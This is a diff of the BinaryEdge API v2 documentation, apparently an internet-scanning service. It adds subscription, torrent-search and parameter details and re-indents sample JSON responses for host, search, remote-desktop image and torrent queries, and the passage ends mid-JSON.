@@ -16,6 +16,33 @@
 curl 'https://api.binaryedge.io/v2/<endpoint>' -H 'X-Key:API_KEY'
 ```
 
+## Swagger Definition
+
+You can download the Swagger OpenApi specification file : [v2.yaml](/swagger/v2.yaml). You can use this with Postman or any other client tool.
+
+## User
+
+#### /v2/user/subscription
+
+Return details about your current subscription package.
+
+*Output*
+
+```shell
+curl 'https://api.binaryedge.io/v2/user/subscription' -H 'X-Key:API_KEY'
+```
+
+```json
+{
+  "subscription":{
+    "name":"Starter"
+  },
+  "end_date":"2019-06-17",
+  "requests_left":4942,
+  "requests_plan":5000
+}
+```
+
 ## Query
 
 ### Host
@@ -38,82 +65,82 @@ curl 'https://api.binaryedge.io/v2/query/ip/xxx.xxx.xxx.xxx' -H 'X-Key:API_KEY'
 
 ```json
 {
-   "total":2,
-   "query":"xxx.xxx.xxx.xxx",
-   "events":[
-      {
-         "results":[
-            {
-               "origin":{
-                  "module":"grabber",
-                  "port":41574,
-                  "ip":"xxx.xxx.xxx.xxx",
-                  "type":"service-simple",
-                  "ts":1537060019061,
-                  "country":"us"
-               },
-               "result":{
-                  "data":{
-                     "state":{
-                        "state":"open"
-                     },
-                     "service":{
-                        "banner":"HTTP/1.1 400 Bad Request\\r\\nDate: Sun, 16 Sep 2018 01:06:58 GMT\\r\\nContent-Type: text/html\\r\\nContent-Length: 268\\r\\nConnection: close\\r\\nserver: nginx\\r\\n\\r\\n<html>\\r\\n<head><title>400 The plain HTTP request was sent to HTTPS port</title></head>\\r\\n<body bgcolor=\"white\">\\r\\n<center><h1>400 Bad Request</h1></center>\\r\\n<center>The plain HTTP request was sent to HTTPS port</center>\\r\\n<hr><center>openresty</center>\\r\\n</body>\\r\\n</html>\\r\\n",
-                        "method":"probe_matching",
-                        "cpe":[
-                           "cpe:/a:igor_sysoev:nginx"
-                        ],
-                        "name":"ssl/http",
-                        "product":"nginx"
-                     }
-                  }
-               },
-               "target":{
-                  "protocol":"tcp",
-                  "port":443,
-                  "ip":"xxx.xxx.xxx.xxx"
-               }
+  "total":2,
+  "query":"xxx.xxx.xxx.xxx",
+  "events":[
+    {
+      "results":[
+        {
+          "origin":{
+            "module":"grabber",
+            "port":41574,
+            "ip":"xxx.xxx.xxx.xxx",
+            "type":"service-simple",
+            "ts":1537060019061,
+            "country":"us"
+          },
+          "result":{
+            "data":{
+              "state":{
+                "state":"open"
+              },
+              "service":{
+                "banner":"HTTP/1.1 400 Bad Request\\r\\nDate: Sun, 16 Sep 2018 01:06:58 GMT\\r\\nContent-Type: text/html\\r\\nContent-Length: 268\\r\\nConnection: close\\r\\nserver: nginx\\r\\n\\r\\n<html>\\r\\n<head><title>400 The plain HTTP request was sent to HTTPS port</title></head>\\r\\n<body bgcolor=\"white\">\\r\\n<center><h1>400 Bad Request</h1></center>\\r\\n<center>The plain HTTP request was sent to HTTPS port</center>\\r\\n<hr><center>openresty</center>\\r\\n</body>\\r\\n</html>\\r\\n",
+                "method":"probe_matching",
+                "cpe":[
+                  "cpe:/a:igor_sysoev:nginx"
+                ],
+                "name":"ssl/http",
+                "product":"nginx"
+              }
             }
-         ],
-         "port":443
-      },
-      {
-         "results":[
-            {
-               "origin":{
-                  "module":"grabber",
-                  "port":54894,
-                  "ip":"xxx.xxx.xxx.xxx",
-                  "type":"service-simple",
-                  "ts":1534658530845,
-                  "country":"de"
-               },
-               "result":{
-                  "data":{
-                     "state":{
-                        "state":"open"
-                     },
-                     "service":{
-                        "banner":"HTTP/1.1 302 Moved Temporarily\\r\\nServer: nginx\\r\\nDate: Sun, 19 Aug 2018 06:02:09 GMT\\r\\nContent-Type: text/html\\r\\nContent-Length: 154\\r\\nConnection: close\\r\\nLocation: http://www.baidu.com/\\r\\n\\r\\n<html>\\r\\n<head><title>302 Found</title></head>\\r\\n<body bgcolor=\"white\">\\r\\n<center><h1>302 Found</h1></center>\\r\\n<hr><center>nginx</center>\\r\\n</body>\\r\\n</html>\\r\\n",
-                        "method":"probe_matching",
-                        "cpe":[
-                           "cpe:/a:igor_sysoev:nginx"
-                        ],
-                        "name":"http",
-                        "product":"nginx"
-                     }
-                  }
-               },
-               "target":{
-                  "protocol":"tcp",
-                  "port":80,
-                  "ip":"xxx.xxx.xxx.xxx"
-               }
+          },
+          "target":{
+            "protocol":"tcp",
+            "port":443,
+            "ip":"xxx.xxx.xxx.xxx"
+          }
+        }
+      ],
+      "port":443
+    },
+    {
+      "results":[
+        {
+          "origin":{
+            "module":"grabber",
+            "port":54894,
+            "ip":"xxx.xxx.xxx.xxx",
+            "type":"service-simple",
+            "ts":1534658530845,
+            "country":"de"
+          },
+          "result":{
+            "data":{
+              "state":{
+                "state":"open"
+              },
+              "service":{
+                "banner":"HTTP/1.1 302 Moved Temporarily\\r\\nServer: nginx\\r\\nDate: Sun, 19 Aug 2018 06:02:09 GMT\\r\\nContent-Type: text/html\\r\\nContent-Length: 154\\r\\nConnection: close\\r\\nLocation: http://www.baidu.com/\\r\\n\\r\\n<html>\\r\\n<head><title>302 Found</title></head>\\r\\n<body bgcolor=\"white\">\\r\\n<center><h1>302 Found</h1></center>\\r\\n<hr><center>nginx</center>\\r\\n</body>\\r\\n</html>\\r\\n",
+                "method":"probe_matching",
+                "cpe":[
+                  "cpe:/a:igor_sysoev:nginx"
+                ],
+                "name":"http",
+                "product":"nginx"
+              }
             }
-         ],
-         "port":80
-      }
-   ]
+          },
+          "target":{
+            "protocol":"tcp",
+            "port":80,
+            "ip":"xxx.xxx.xxx.xxx"
+          }
+        }
+      ],
+      "port":80
+    }
+  ]
 }
 ```
 
@@ -127,6 +154,10 @@ List of events for the specified host, with events for each time that:
 - A service was found running
 - Other modules were successfully executed 
 
+**Note**: Available for paid subscriptions only.
+
+* 1 IP = 1 credit
+
 *Parameters*
 
 * target: [String] target IP address 
@@ -139,77 +170,77 @@ curl 'https://api.binaryedge.io/v2/query/ip/historical/xxx.xxx.xxx.xxx' -H 'X-Ke
 
 ```json
 {
-    "total": 4,
-    "query": "xxx.xxx.xxx.xxx",
-    "events": [{
-        "target": {
-            "ip": "xxx.xxx.xxx.xxx",
-            "protocol": "tcp",
-            "port": 25
+  "total": 4,
+  "query": "xxx.xxx.xxx.xxx",
+  "events": [{
+    "target": {
+      "ip": "xxx.xxx.xxx.xxx",
+      "protocol": "tcp",
+      "port": 25
+    },
+    "origin": {
+      "type": "port",
+      "ts": 1533433200683
+    },
+    "result": null
+  }, {
+    "target": {
+      "ip": "xxx.xxx.xxx.xxx",
+      "protocol": "tcp",
+      "port": 25
+    },
+    "origin": {
+      "type": "port",
+      "ts": 1530560172852
+    },
+    "result": null
+  }, {
+    "target": {
+      "ip": "xxx.xxx.xxx.xxx",
+      "protocol": "tcp",
+      "port": 25
+    },
+    "origin": {
+      "type": "service-simple",
+      "ts": 1533438628984
+    },
+    "result": {
+      "data": {
+        "state": {
+          "state": "open"
         },
-        "origin": {
-            "type": "port",
-            "ts": 1533433200683
-        },
-        "result": null
-    }, {
-        "target": {
-            "ip": "xxx.xxx.xxx.xxx",
-            "protocol": "tcp",
-            "port": 25
-        },
-        "origin": {
-            "type": "port",
-            "ts": 1530560172852
-        },
-        "result": null
-    }, {
-        "target": {
-            "ip": "xxx.xxx.xxx.xxx",
-            "protocol": "tcp",
-            "port": 25
-        },
-        "origin": {
-            "type": "service-simple",
-            "ts": 1533438628984
-        },
-        "result": {
-            "data": {
-                "state": {
-                    "state": "open"
-                },
-                "service": {
-                    "product": "Incapsula CDN httpd",
-                    "banner": "HTTP/1.1 503 Service Unavailable\\r\\nContent-Type: text/html\\r\\nCache-Control: no-cache\\r\\nConnection: close\\r\\nContent-Length: 655\\r\\nX-Iinfo: 9-332984787-0 0NNN RT(1533438628522 0) q(0 -1 -1 -1) r(0 -1)\\r\\n\\r\\n<html style=\"height:100%\"><head><META NAME=\"ROBOTS\" CONTENT=\"NOINDEX, NOFOLLOW\"><meta name=\"format-detection\" content=\"telephone=no\"><meta name=\"viewport\" content=\"initial-scale=1.0\"><meta http-equiv=\"X-UA-Compatible\" content=\"IE=edge,chrome=1\"></head><body style=\"margin:0px;height:100%\"><iframe src=\"/_Incapsula_Resource?CWUDNSAI=5&xinfo=9-332984787-0%200NNN%20RT%281533438628522%200%29%20q%280%20-1%20-1%20-1%29%20r%280%20-1%29&incident_id=0-1199990858670542825&edet=9&cinfo=ffffffff\" frameborder=0 width=\"100%\" height=\"100%\" marginheight=\"0px\" marginwidth=\"0px\">Request unsuccessful. Incapsula incident ID: 0-1199990858670542825</iframe></body></html>",
-                    "name": "http",
-                    "method": "probe_matching"
-                }
-            }
+        "service": {
+          "product": "Incapsula CDN httpd",
+          "banner": "HTTP/1.1 503 Service Unavailable\\r\\nContent-Type: text/html\\r\\nCache-Control: no-cache\\r\\nConnection: close\\r\\nContent-Length: 655\\r\\nX-Iinfo: 9-332984787-0 0NNN RT(1533438628522 0) q(0 -1 -1 -1) r(0 -1)\\r\\n\\r\\n<html style=\"height:100%\"><head><META NAME=\"ROBOTS\" CONTENT=\"NOINDEX, NOFOLLOW\"><meta name=\"format-detection\" content=\"telephone=no\"><meta name=\"viewport\" content=\"initial-scale=1.0\"><meta http-equiv=\"X-UA-Compatible\" content=\"IE=edge,chrome=1\"></head><body style=\"margin:0px;height:100%\"><iframe src=\"/_Incapsula_Resource?CWUDNSAI=5&xinfo=9-332984787-0%200NNN%20RT%281533438628522%200%29%20q%280%20-1%20-1%20-1%29%20r%280%20-1%29&incident_id=0-1199990858670542825&edet=9&cinfo=ffffffff\" frameborder=0 width=\"100%\" height=\"100%\" marginheight=\"0px\" marginwidth=\"0px\">Request unsuccessful. Incapsula incident ID: 0-1199990858670542825</iframe></body></html>",
+          "name": "http",
+          "method": "probe_matching"
         }
-    }, {
-        "target": {
-            "ip": "xxx.xxx.xxx.xxx",
-            "protocol": "tcp",
-            "port": 25
+      }
+    }
+  }, {
+    "target": {
+      "ip": "xxx.xxx.xxx.xxx",
+      "protocol": "tcp",
+      "port": 25
+    },
+    "origin": {
+      "type": "service-simple",
+      "ts": 1530601327765
+    },
+    "result": {
+      "data": {
+        "state": {
+          "state": "open"
         },
-        "origin": {
-            "type": "service-simple",
-            "ts": 1530601327765
-        },
-        "result": {
-            "data": {
-                "state": {
-                    "state": "open"
-                },
-                "service": {
-                    "product": "Incapsula CDN httpd",
-                    "banner": "HTTP/1.1 503 Service Unavailable\\r\\nContent-Type: text/html\\r\\nCache-Control: no-cache\\r\\nConnection: close\\r\\nContent-Length: 653\\r\\nX-Iinfo: 5-120325528-0 0NNN RT(1530601326800 0) q(0 -1 -1 -1) r(0 -1)\\r\\n\\r\\n<html style=\"height:100%\"><head><META NAME=\"ROBOTS\" CONTENT=\"NOINDEX, NOFOLLOW\"><meta name=\"format-detection\" content=\"telephone=no\"><meta name=\"viewport\" content=\"initial-scale=1.0\"><meta http-equiv=\"X-UA-Compatible\" content=\"IE=edge,chrome=1\"></head><body style=\"margin:0px;height:100%\"><iframe src=\"/_Incapsula_Resource?CWUDNSAI=5&xinfo=5-120325528-0%200NNN%20RT%281530601326800%200%29%20q%280%20-1%20-1%20-1%29%20r%280%20-1%29&incident_id=0-373539121141122165&edet=9&cinfo=ffffffff\" frameborder=0 width=\"100%\" height=\"100%\" marginheight=\"0px\" marginwidth=\"0px\">Request unsuccessful. Incapsula incident ID: 0-373539121141122165</iframe></body></html>",
-                    "name": "http",
-                    "method": "probe_matching"
-                }
-            }
+        "service": {
+          "product": "Incapsula CDN httpd",
+          "banner": "HTTP/1.1 503 Service Unavailable\\r\\nContent-Type: text/html\\r\\nCache-Control: no-cache\\r\\nConnection: close\\r\\nContent-Length: 653\\r\\nX-Iinfo: 5-120325528-0 0NNN RT(1530601326800 0) q(0 -1 -1 -1) r(0 -1)\\r\\n\\r\\n<html style=\"height:100%\"><head><META NAME=\"ROBOTS\" CONTENT=\"NOINDEX, NOFOLLOW\"><meta name=\"format-detection\" content=\"telephone=no\"><meta name=\"viewport\" content=\"initial-scale=1.0\"><meta http-equiv=\"X-UA-Compatible\" content=\"IE=edge,chrome=1\"></head><body style=\"margin:0px;height:100%\"><iframe src=\"/_Incapsula_Resource?CWUDNSAI=5&xinfo=5-120325528-0%200NNN%20RT%281530601326800%200%29%20q%280%20-1%20-1%20-1%29%20r%280%20-1%29&incident_id=0-373539121141122165&edet=9&cinfo=ffffffff\" frameborder=0 width=\"100%\" height=\"100%\" marginheight=\"0px\" marginwidth=\"0px\">Request unsuccessful. Incapsula incident ID: 0-373539121141122165</iframe></body></html>",
+          "name": "http",
+          "method": "probe_matching"
         }
-    }]
+      }
+    }
+  }]
 }
 ```
 
@@ -217,10 +248,13 @@ curl 'https://api.binaryedge.io/v2/query/ip/historical/xxx.xxx.xxx.xxx' -H 'X-Ke
 
 Events based on a Query. List of recent events for the given query, including details of exposed ports and services. Can be used with specific parameters and/or full-text search.
 
-*Parameters*
+* 1 page/request = 1 credit
+
+*Query Parameters*
 
 * query: [String] String used to query our data. If no filters are used, it will perform a full-text search on the entire events. See [Search Parameters](search.md) for details on what parameters can be used.
 * page: [Int] Optional. Default 1, Maximum: 500 (10,000 results)
+* only_ips: [Int] Optional. If selected, only output IP addresses, ports and protocols.
 
 *Output*
 
@@ -230,14 +264,64 @@ curl 'https://api.binaryedge.io/v2/query/search?query=name:ldap%20AND%20ip:xxx.x
 
 ```json
 {
-    "query":"name:ldap AND ip:xxx.xxx.xxx.xxx",
-    "total": 2,
-    "page": 1,
-    "pagesize": 50,
-    "events": [
-        {"origin":{"type":"service-simple","module":"grabber","country":"uk","ts":1535985193912,"ip":"xxx.xxx.xxx.xxx","port":48872},"target":{"ip":"xxx.xxx.xxx.xxx","port":389,"protocol":"tcp"},"result":{"data":{"service":{"name":"ldap","method":"table_default"},"state":{"state":"open|filtered"}}}},
-        {"origin":{"type":"service-simple","module":"grabber","country":"us","ts":1535985193942,"ip":"xxx.xxx.xxx.xxx","port":38226},"target":{"ip":"xxx.xxx.xxx.xxx","port":389,"protocol":"tcp"},"result":{"data":{"service":{"name":"ldap","method":"table_default"},"state":{"state":"open|filtered"}}}}
-    ] 
+  "query":"name:ldap AND ip:xxx.xxx.xxx.xxx",
+  "total": 2,
+  "page": 1,
+  "pagesize": 20,
+  "events": [
+    {
+      "origin":{
+        "type":"service-simple",
+        "module":"grabber",
+        "country":"uk",
+        "ts":1535985193912,
+        "ip":"xxx.xxx.xxx.xxx",
+        "port":48872
+      },
+      "target":{
+        "ip":"xxx.xxx.xxx.xxx",
+        "port":389,
+        "protocol":"tcp"
+      },
+      "result":{
+        "data":{
+          "service":{
+            "name":"ldap",
+            "method":"table_default"
+          },
+          "state":{
+            "state":"open|filtered"
+          }
+        }
+      }
+    },
+    {
+      "origin":{
+        "type":"service-simple",
+        "module":"grabber",
+        "country":"us",
+        "ts":1535985193942,
+        "ip":"xxx.xxx.xxx.xxx",
+        "port":38226
+      },
+      "target":{
+        "ip":"xxx.xxx.xxx.xxx",
+        "port":389,
+        "protocol":"tcp"
+      },
+      "result":{
+        "data":{
+          "service":{
+            "name":"ldap",
+            "method":"table_default"
+          },
+          "state":{
+            "state":"open|filtered"
+          }
+        }
+      }
+    }
+  ] 
 }
 ```
 
@@ -250,6 +334,8 @@ Statistics of recent events for the given query. Can be used with specific param
 * query: [String] String used to query our data. If no filters are used, it will perform a full-text search on the entire events. See [Search Parameters](search.md) for details on what parameters can be used.
 * type: [String] Type of statistic we want to obtain. Possible types include:
     * _ports_, _products_, _versions_, _tags_, _services_, _countries_, _asn_.
+* order: [String] Whether to sort descendently or ascendently to get the top.
+    * _desc_, _asc_
 
 *Output*
 
@@ -259,52 +345,52 @@ curl 'https://api.binaryedge.io/v2/query/search/stats?query=name:ldap%20AND%20ip
 
 ```json
 [
-    {
-        "key": "80/tcp",
-        "doc_count": 4467584
-    },
-    {
-        "key": "22/tcp",
-        "doc_count": 4244020
-    },
-    {
-        "key": "53/tcp",
-        "doc_count": 3566098
-    },
-    {
-        "key": "443/tcp",
-        "doc_count": 3478298
-    },
-    {
-        "key": "21/tcp",
-        "doc_count": 2726635
-    },
-    {
-        "key": "3389/tcp",
-        "doc_count": 2303493
-    },
-    {
-        "key": "1900/tcp",
-        "doc_count": 2172479
-    },
-    {
-        "key": "123/tcp",
-        "doc_count": 2111621
-    },
-    {
-        "key": "23/tcp",
-        "doc_count": 1988782
-    },
-    {
-        "key": "8000",
-        "doc_count": 1931731
-    }
+  {
+    "key": "80/tcp",
+    "doc_count": 4467584
+  },
+  {
+    "key": "22/tcp",
+    "doc_count": 4244020
+  },
+  {
+    "key": "53/tcp",
+    "doc_count": 3566098
+  },
+  {
+    "key": "443/tcp",
+    "doc_count": 3478298
+  },
+  {
+    "key": "21/tcp",
+    "doc_count": 2726635
+  },
+  {
+    "key": "3389/tcp",
+    "doc_count": 2303493
+  },
+  {
+    "key": "1900/tcp",
+    "doc_count": 2172479
+  },
+  {
+    "key": "123/tcp",
+    "doc_count": 2111621
+  },
+  {
+    "key": "23/tcp",
+    "doc_count": 1988782
+  },
+  {
+    "key": "8000/tcp",
+    "doc_count": 1931731
+  }
 ]
 ```
 
 ### Image
 
-#### /v2/query/image/ip/{ip}
+#### /v2/query/image/ip/{target}
 
 Details about Remote Desktops found on an Host. List of screenshots and details extracted from them for the specified host, including OCR and whether faces were found or not, with data up to 2 months.
 
@@ -321,40 +407,40 @@ curl 'https://api.binaryedge.io/v2/query/image/ip/xxx.xxx.xxx.xxx' -H 'X-Key:API
 
 ```json
 {
-   "pagesize":20,
-   "query":"xxx.xxx.xxx.xxx",
-   "total":1,
-   "page":1,
-   "events":[
-      {
-         "thumb":"https://d3f9qnon04ymh2.cloudfront.net/993cad4bb78fc0fa3e8f5f1d07311af802ea73ac48b6143c6286ae54df.jpg",
-         "tags":[
-            "VNC"
-         ],
-         "ts":1536345753000,
-         "port":5900,
-         "url":"https://d1ngxp4ef6grqi.cloudfront.net/993cad4bb78fc0fa3e8f5f1d07311af802ea73ac48b6143c6286ae54df.jpg",
-         "height":800,
-         "geoip":{
-            "iso_code":"BE",
-            "timezone":"Europe/Brussels",
-            "latitude":50.85,
-            "longitude":4.35,
-            "location":[
-               4.35,
-               50.85
-            ],
-            "country_name":"Belgium",
-            "city_name":null
-         },
-         "ip":"xxx.xxx.xxx.xxx",
-         "country":"BE",
-         "as_name":"Proximus NV",
-         "asn":5432,
-         "width":1280,
-         "image_id":"993cad4bb78fc0fa3e8f5f1d07311af802ea73ac48b6143c6286ae54df"
-      }
-   ]
+  "pagesize":20,
+  "query":"xxx.xxx.xxx.xxx",
+  "total":1,
+  "page":1,
+  "events":[
+    {
+      "thumb":"https://d3f9qnon04ymh2.cloudfront.net/993cad4bb78fc0fa3e8f5f1d07311af802ea73ac48b6143c6286ae54df.jpg",
+      "tags":[
+        "VNC"
+      ],
+      "ts":1536345753000,
+      "port":5900,
+      "url":"https://d1ngxp4ef6grqi.cloudfront.net/993cad4bb78fc0fa3e8f5f1d07311af802ea73ac48b6143c6286ae54df.jpg",
+      "height":800,
+      "geoip":{
+        "iso_code":"BE",
+        "timezone":"Europe/Brussels",
+        "latitude":50.85,
+        "longitude":4.35,
+        "location":[
+          4.35,
+          50.85
+        ],
+        "country_name":"Belgium",
+        "city_name":null
+      },
+      "ip":"xxx.xxx.xxx.xxx",
+      "country":"BE",
+      "as_name":"Proximus NV",
+      "asn":5432,
+      "width":1280,
+      "image_id":"993cad4bb78fc0fa3e8f5f1d07311af802ea73ac48b6143c6286ae54df"
+    }
+  ]
 }
 ```
 
@@ -375,40 +461,40 @@ curl 'https://api.binaryedge.io/v2/query/image/search?query=ip:xxx.xxx.xxx.xxx%2
 
 ```json
 {
-   "pagesize":20,
-   "query":"ip:xxx.xxx.xxx.xxx AND country:BE",
-   "total":1,
-   "page":1,
-   "events":[
-      {
-         "thumb":"https://d3f9qnon04ymh2.cloudfront.net/993cad4bb78fc0fa3e8f5f1d07311af802ea73ac48b6143c6286ae54df.jpg",
-         "tags":[
-            "VNC"
-         ],
-         "ts":1536345753000,
-         "port":5900,
-         "url":"https://d1ngxp4ef6grqi.cloudfront.net/993cad4bb78fc0fa3e8f5f1d07311af802ea73ac48b6143c6286ae54df.jpg",
-         "height":800,
-         "geoip":{
-            "iso_code":"BE",
-            "timezone":"Europe/Brussels",
-            "latitude":50.85,
-            "longitude":4.35,
-            "location":[
-               4.35,
-               50.85
-            ],
-            "country_name":"Belgium",
-            "city_name":null
-         },
-         "ip":"xxx.xxx.xxx.xxx",
-         "country":"BE",
-         "as_name":"Proximus NV",
-         "asn":5432,
-         "width":1280,
-         "image_id":"993cad4bb78fc0fa3e8f5f1d07311af802ea73ac48b6143c6286ae54df"
-      }
-   ]
+  "pagesize":20,
+  "query":"ip:xxx.xxx.xxx.xxx AND country:BE",
+  "total":1,
+  "page":1,
+  "events":[
+    {
+      "thumb":"https://d3f9qnon04ymh2.cloudfront.net/993cad4bb78fc0fa3e8f5f1d07311af802ea73ac48b6143c6286ae54df.jpg",
+      "tags":[
+        "VNC"
+      ],
+      "ts":1536345753000,
+      "port":5900,
+      "url":"https://d1ngxp4ef6grqi.cloudfront.net/993cad4bb78fc0fa3e8f5f1d07311af802ea73ac48b6143c6286ae54df.jpg",
+      "height":800,
+      "geoip":{
+        "iso_code":"BE",
+        "timezone":"Europe/Brussels",
+        "latitude":50.85,
+        "longitude":4.35,
+        "location":[
+          4.35,
+          50.85
+        ],
+        "country_name":"Belgium",
+        "city_name":null
+      },
+      "ip":"xxx.xxx.xxx.xxx",
+      "country":"BE",
+      "as_name":"Proximus NV",
+      "asn":5432,
+      "width":1280,
+      "image_id":"993cad4bb78fc0fa3e8f5f1d07311af802ea73ac48b6143c6286ae54df"
+    }
+  ]
 }
 ```
 
@@ -430,6 +516,8 @@ curl 'https://api.binaryedge.io/v2/query/image/tags' -H 'X-Key:API_KEY'
 
 #### /v2/query/torrent/ip/{target}
 
+**Note**: Available for paid subscriptions only.
+
 Details about torrents transferred by an Host. List of recent torrent events for the specified host, including details of the peer and torrent. See [Torrent Data](torrent.md) for more details.
 
 *Parameters*
@@ -444,50 +532,52 @@ curl 'https://api.binaryedge.io/v2/query/torrent/ip/xxx.xxx.xxx.xxx' -H 'X-Key:A
 
 ```json
 {
-   "query":"xxx.xxx.xxx.xxx",
-   "total":5,
-   "events":[
-      {
-         "origin":{
-            "type":"peer",
-            "module":"torrent",
-            "ts":1539766360923
-         },
-         "peer":{
-            "ip":"xxx.xxx.xxx.xxx",
-            "port":29252
-         },
-         "torrent":{
-            "infohash":"0912d200210318a5f65450e63834f4100293ae48",
-            "name":"A.Family.for.the.Holidays.2018.BRRip.XviD.AC3-EVO[TGx]",
-            "source":"ThePirateBay",
-            "category":"Video",
-            "subcategory":"Movies"
-         }
+  "query":"xxx.xxx.xxx.xxx",
+  "total":5,
+  "events":[
+    {
+      "origin":{
+        "type":"peer",
+        "module":"torrent",
+        "ts":1539766360923
       },
-      {
-         "origin":{
-            "type":"peer",
-            "module":"torrent",
-            "ts":1539740702093
-         },
-         "peer":{
-            "ip":"xxx.xxx.xxx.xxx",
-            "port":29252
-         },
-         "torrent":{
-            "infohash":"5d917a61489cba4ad346962f352b64b2c652e43b",
-            "name":"Big.Hero.6.The.Series.S01E23E24E25.AMZN.WEB-DL.XviD.MP3",
-            "source":"ThePirateBay",
-            "category":"Video",
-            "subcategory":"TV shows"
-         }
+      "peer":{
+        "ip":"xxx.xxx.xxx.xxx",
+        "port":29252
       },
-   ]
+      "torrent":{
+        "infohash":"0912d200210318a5f65450e63834f4100293ae48",
+        "name":"A.Family.for.the.Holidays.2018.BRRip.XviD.AC3-EVO[TGx]",
+        "source":"ThePirateBay",
+        "category":"Video",
+        "subcategory":"Movies"
+      }
+    },
+    {
+      "origin":{
+        "type":"peer",
+        "module":"torrent",
+        "ts":1539740702093
+      },
+      "peer":{
+        "ip":"xxx.xxx.xxx.xxx",
+        "port":29252
+      },
+      "torrent":{
+        "infohash":"5d917a61489cba4ad346962f352b64b2c652e43b",
+        "name":"Big.Hero.6.The.Series.S01E23E24E25.AMZN.WEB-DL.XviD.MP3",
+        "source":"ThePirateBay",
+        "category":"Video",
+        "subcategory":"TV shows"
+      }
+    },
+  ]
 }
 ```
 
 #### /v2/query/torrent/historical/{target}
+
+**Note**: Available for paid subscriptions only.
 
 Details about torrents transferred by an Host, with data up to 6 months.
 
@@ -507,83 +597,200 @@ curl 'https://api.binaryedge.io/v2/query/torrent/historical/xxx.xxx.xxx.xxx' -H 
 
 ```json
 {
-   "query":"xxx.xxx.xxx.xxx",
-   "total":104,
-   "events":[
-      {
-         "origin":{
-            "type":"peer",
-            "module":"torrent",
-            "ts":1539766360923
-         },
-         "peer":{
-            "ip":"xxx.xxx.xxx.xxx",
-            "port":29252
-         },
-         "torrent":{
-            "infohash":"0912d200210318a5f65450e63834f4100293ae48",
-            "name":"A.Family.for.the.Holidays.2018.BRRip.XviD.AC3-EVO[TGx]",
-            "source":"ThePirateBay",
-            "category":"Video",
-            "subcategory":"Movies"
-         }
+  "query":"xxx.xxx.xxx.xxx",
+  "total":104,
+  "events":[
+    {
+      "origin":{
+        "type":"peer",
+        "module":"torrent",
+        "ts":1539766360923
       },
-      {
-         "origin":{
-            "type":"peer",
-            "module":"torrent",
-            "ts":1539766357370
-         },
-         "peer":{
-            "ip":"xxx.xxx.xxx.xxx",
-            "port":29252
-         },
-         "torrent":{
-            "infohash":"0912d200210318a5f65450e63834f4100293ae48",
-            "name":"A.Family.for.the.Holidays.2018.BRRip.XviD.AC3-EVO[TGx]",
-            "source":"ThePirateBay",
-            "category":"Video",
-            "subcategory":"Movies"
-         }
+      "peer":{
+        "ip":"xxx.xxx.xxx.xxx",
+        "port":29252
       },
-      {
-         "origin":{
-            "type":"peer",
-            "module":"torrent",
-            "ts":1539740702093
-         },
-         "peer":{
-            "ip":"xxx.xxx.xxx.xxx",
-            "port":29252
-         },
-         "torrent":{
-            "infohash":"5d917a61489cba4ad346962f352b64b2c652e43b",
-            "name":"Big.Hero.6.The.Series.S01E23E24E25.AMZN.WEB-DL.XviD.MP3",
-            "source":"ThePirateBay",
-            "category":"Video",
-            "subcategory":"TV shows"
-         }
-      },
-      {
-         "origin":{
-            "type":"peer",
-            "module":"torrent",
-            "ts":1539740701112
-         },
-         "peer":{
-            "ip":"xxx.xxx.xxx.xxx",
-            "port":29252
-         },
-         "torrent":{
-            "infohash":"5d917a61489cba4ad346962f352b64b2c652e43b",
-            "name":"Big.Hero.6.The.Series.S01E23E24E25.AMZN.WEB-DL.XviD.MP3",
-            "source":"ThePirateBay",
-            "category":"Video",
-            "subcategory":"TV shows"
-         }
+      "torrent":{
+        "infohash":"0912d200210318a5f65450e63834f4100293ae48",
+        "name":"A.Family.for.the.Holidays.2018.BRRip.XviD.AC3-EVO[TGx]",
+        "source":"ThePirateBay",
+        "category":"Video",
+        "subcategory":"Movies"
       }
-   ]
+    },
+    {
+      "origin":{
+        "type":"peer",
+        "module":"torrent",
+        "ts":1539766357370
+      },
+      "peer":{
+        "ip":"xxx.xxx.xxx.xxx",
+        "port":29252
+      },
+      "torrent":{
+        "infohash":"0912d200210318a5f65450e63834f4100293ae48",
+        "name":"A.Family.for.the.Holidays.2018.BRRip.XviD.AC3-EVO[TGx]",
+        "source":"ThePirateBay",
+        "category":"Video",
+        "subcategory":"Movies"
+      }
+    },
+    {
+      "origin":{
+        "type":"peer",
+        "module":"torrent",
+        "ts":1539740702093
+      },
+      "peer":{
+        "ip":"xxx.xxx.xxx.xxx",
+        "port":29252
+      },
+      "torrent":{
+        "infohash":"5d917a61489cba4ad346962f352b64b2c652e43b",
+        "name":"Big.Hero.6.The.Series.S01E23E24E25.AMZN.WEB-DL.XviD.MP3",
+        "source":"ThePirateBay",
+        "category":"Video",
+        "subcategory":"TV shows"
+      }
+    },
+    {
+      "origin":{
+        "type":"peer",
+        "module":"torrent",
+        "ts":1539740701112
+      },
+      "peer":{
+        "ip":"xxx.xxx.xxx.xxx",
+        "port":29252
+      },
+      "torrent":{
+        "infohash":"5d917a61489cba4ad346962f352b64b2c652e43b",
+        "name":"Big.Hero.6.The.Series.S01E23E24E25.AMZN.WEB-DL.XviD.MP3",
+        "source":"ThePirateBay",
+        "category":"Video",
+        "subcategory":"TV shows"
+      }
+    }
+  ]
 }
+```
+
+#### /v2/query/torrent/search
+
+**Note**: Available for paid subscriptions only.
+
+Events based on a Query. List of recent events for the given query, including details of the peer and torrent. Can be used with specific parameters and/or full-text search.
+
+*Parameters*
+
+* query: [String] String used to query our data. If no filters are used, it will perform a full-text search on the entire events. See [Search Parameters](torrents-search.md) for details on what parameters can be used.
+* page: [Int] Optional. Default 1, Maximum: 500 (10,000 results)
+
+*Output*
+
+```shell
+curl 'https://api.binaryedge.io/v2/query/torrent/search?query=category:video' -H 'X-Key:API_KEY'
+```
+
+```json
+{
+  "query":"category:video",
+  "page":1,
+  "pagesize":20,
+  "total":3149612,
+  "events":[
+    {
+      "origin":{
+        "type":"peer",
+        "module":"torrent",
+        "ts":1565166671255
+      },
+      "node":{
+        "ip":"xxx.xxx.xxx.xxx",
+        "port":2949
+      },
+      "peer":{
+        "ip":"xxx.xxx.xxx.xxx",
+        "port":6881
+      },
+      "torrent":{
+        "infohash":"d5380fcda66b48fb8b521d5c3b5e61b91c94775e",
+        "name":"Britain's Best Back Gardens Series",
+        "source":"ThePirateBay",
+        "category":"Video",
+        "subcategory":"TV shows"
+      }
+    },
+    {
+      "origin":{
+        "type":"peer",
+        "module":"torrent",
+        "ts":1565166671242
+      },
+      "node":{
+        "ip":"xxx.xxx.xxx.xxx",
+        "port":8999
+      },
+      "peer":{
+        "ip":"xxx.xxx.xxx.xxx",
